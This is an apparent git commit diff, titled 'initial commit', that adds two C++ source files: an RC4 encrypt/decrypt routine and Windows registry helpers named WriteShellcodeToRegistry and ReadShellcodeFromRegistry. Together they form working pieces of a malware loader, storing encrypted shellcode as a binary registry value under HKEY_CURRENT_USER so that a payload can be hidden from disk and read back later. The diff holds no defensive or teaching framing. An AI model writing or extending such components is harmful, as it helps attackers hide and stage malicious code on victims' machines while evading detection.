13e96a107d30d9dbfca2307b2d0a454682fbadb5
cthomas10101010 <cthomas10101010@gmail.com>
2024-10-18 14:41:21 -0500

    initial commit

--- src/rc4.cpp
+++ src/rc4.cpp
@@ -1,1 +1,23 @@
 Purpose: Implements the RC4 encryption and decryption algorithm.
+#include "rc4.h"
+
+void RC4EncryptDecrypt(std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
+    std::vector<uint8_t> s(256);
+    uint8_t j = 0;
+
+    for (int i = 0; i < 256; ++i) {
+        s[i] = i;
+    }
+
+    for (int i = 0, k = 0; i < 256; ++i) {
+        k = (k + s[i] + key[i % key.size()]) % 256;
+        std::swap(s[i], s[k]);
+    }
+
+    for (int i = 0, k = 0, l = 0; i < data.size(); ++i) {
+        k = (k + 1) % 256;
+        l = (l + s[k]) % 256;
+        std::swap(s[k], s[l]);
+        data[i] ^= s[(s[k] + s[l]) % 256];
+    }
+}
--- src/registry_utils.cpp
+++ src/registry_utils.cpp
@@ -1,1 +1,39 @@
-Purpose: Provides utility functions for interacting with the Windows Registry (e.g., creating, reading, writing, deleting keys/values).
+#include "registry_utils.h"
+#include <windows.h>
+#include <iostream>
+
+bool WriteShellcodeToRegistry(const std::string& key, const std::string& valueName, const BYTE* data, DWORD dataSize) {
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, key.c_str(), 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
+        std::cerr << "Failed to open registry key for writing.\n";
+        return false;
+    }
+
+    if (RegSetValueExA(hKey, valueName.c_str(), 0, REG_BINARY, data, dataSize) != ERROR_SUCCESS) {
+        std::cerr << "Failed to write to registry.\n";
+        RegCloseKey(hKey);
+        return false;
+    }
+
+    RegCloseKey(hKey);
+    return true;
+}
+
+bool ReadShellcodeFromRegistry(const std::string& key, const std::string& valueName, BYTE* buffer, DWORD bufferSize) {
+    HKEY hKey;
+    DWORD type = REG_BINARY;
+
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, key.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
+        std::cerr << "Failed to open registry key for reading.\n";
+        return false;
+    }
+
+    if (RegGetValueA(hKey, NULL, valueName.c_str(), RRF_RT_REG_BINARY, &type, buffer, &bufferSize) != ERROR_SUCCESS) {
+        std::cerr << "Failed to read from registry.\n";
+        RegCloseKey(hKey);
+        return false;
+    }
+
+    RegCloseKey(hKey);
+    return true;
+}
